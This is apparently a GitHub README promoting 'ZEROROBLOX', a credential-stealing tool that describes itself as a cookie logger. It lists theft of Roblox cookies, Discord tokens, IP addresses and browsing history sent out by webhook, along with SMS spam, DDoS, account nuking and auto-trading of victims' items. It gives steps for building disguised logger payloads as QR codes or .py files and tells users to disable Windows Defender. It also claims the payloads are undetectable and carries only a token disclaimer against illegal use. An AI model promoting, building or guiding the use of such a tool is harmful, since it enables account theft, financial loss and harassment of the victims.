# ZEROROBLOX

![image-removebg-preview (1)](https://user-images.githubusercontent.com/73804475/216054785-a539cedb-3834-4da8-b532-4fca4fe34770.png)


UPDATE - FASTER WEBHOOK SENDING!


An intuitive roblox cookie logger that can be used to get the victims cookies, tokens, and many other misc files on the users computer and network.

## FEATURES 

roblox cookie 

discord token

ip log

browsing history

webhook integration

SMS spam

DOS/DDOS

account nuke

auto trade limiteds

## Getting Started
  Download the files from github (open source woohoo :-) ) 
  run the build-gui.exe file and let it create all necessary folders and directories 
  hit "0" to pull up the logger creation settings 
  use the logger files/scripts how you want! these can be configured as QR codes or .PY files. 
  WE DO NOT ENCOURAGE ANY ILLEGAL USE! 
  
  ⚠️NOTE! THE EXE FILE MAY BE FLAGGED BY WINDOWS DEFENDER, BUT THE LOGGING METHODS THAT ARE GENERATED ARE FULLY UNDETECTABLE! BE SURE TO DISABLE IT IF THE BUILDER WONT RUN⚠️
 

### Dependencies

* .NET framework x64


## Authors


hmu on discord if you have any questions
  matrixdevs#0001 

## Version History

* 0.2
    * Various bug fixes and optimizations
    * See [commit change]() or See [release history]()
* 0.1
    * Initial Release

## License

see the LICENSE.md file for details


![image](https://user-images.githubusercontent.com/73804475/213949021-75f5c1bf-9e29-46ce-93ef-a798163d1b99.png)![image](https://user-images.githubusercontent.com/73804475/213949042-5c3f19b1-c3ba-4d92-bb14-a727fbc003b8.png)

